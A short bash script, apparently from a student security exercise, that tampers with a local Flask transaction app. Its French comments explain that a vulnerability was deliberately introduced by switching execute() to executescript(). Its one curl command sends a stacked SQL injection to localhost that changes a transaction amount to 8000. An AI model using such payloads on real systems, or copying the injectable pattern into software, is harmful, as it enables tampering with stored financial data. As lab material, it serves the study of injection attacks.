#!/bin/bash

#EXERCICE 4. Attaquer le système en modifiant directement le fichier de données, en changeant le montant d’une transaction
#pour cela j'ai modifié le fichier tchai.py en remplaçant l'execute par excecutescript
#car execute() ne peut executé qu'1 seul script à la fois contrairement à executescript() 

#la commande suivante permet une injection sql qui modifie la valeur de amount en 8000
curl -X GET "http://0.0.0.0:5000/deal/1%20;%20UPDATE%20DEAL%20SET%20amount%20=%208000%20WHERE%20sender=1;--%20"
